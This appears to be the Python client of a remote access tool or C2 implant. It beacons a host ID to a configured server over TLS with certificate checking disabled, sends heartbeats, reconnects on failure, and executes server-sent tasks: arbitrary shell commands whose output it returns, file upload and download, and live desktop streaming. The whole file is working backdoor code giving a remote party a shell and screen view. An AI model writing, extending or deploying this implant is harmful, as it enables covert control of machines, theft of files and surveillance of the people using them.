import asyncio, ssl, uuid, socket, time
from protocol import encode, decode
from config import SERVER_HOST, SERVER_PORT, HEARTBEAT_INTERVAL
from file_ops import handle_upload, handle_download
from screen_stream import stream_desktop

CLIENT_ID = f"{socket.gethostname()}-{uuid.uuid4()}"

async def heartbeat(writer):
    while True:
        writer.write(encode({"type":"heartbeat"}))
        await writer.drain()
        await asyncio.sleep(HEARTBEAT_INTERVAL)

async def handle_tasks(reader, writer):
    while True:
        msg = await decode(reader)
        if not msg or msg["type"]!="task": continue
        action = msg["action"]
        if action=="exec":
            import subprocess
            cmd = msg["payload"]["cmd"]
            try:
                result = subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=30)
                writer.write(encode({"type":"task_result","task_id":msg["task_id"],"status":"ok","stdout":result.stdout,"stderr":result.stderr}))
            except Exception as e:
                writer.write(encode({"type":"task_result","task_id":msg["task_id"],"status":"error","stderr":str(e)}))
            await writer.drain()
        elif action=="upload":
            await handle_upload(msg)
        elif action=="download":
            await handle_download(msg, writer)
        elif action=="start_stream":
            fps = msg["payload"].get("fps",2)
            asyncio.create_task(stream_desktop(writer,fps))

async def run():
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    while True:
        try:
            reader, writer = await asyncio.open_connection(SERVER_HOST,SERVER_PORT,ssl=ssl_ctx)
            writer.write(encode({"type":"hello","client_id":CLIENT_ID,"info":{"hostname":socket.gethostname(),"os":socket.getfqdn()}}))
            await writer.drain()
            await asyncio.gather(heartbeat(writer),handle_tasks(reader,writer))
        except Exception:
            await asyncio.sleep(5)

asyncio.run(run())
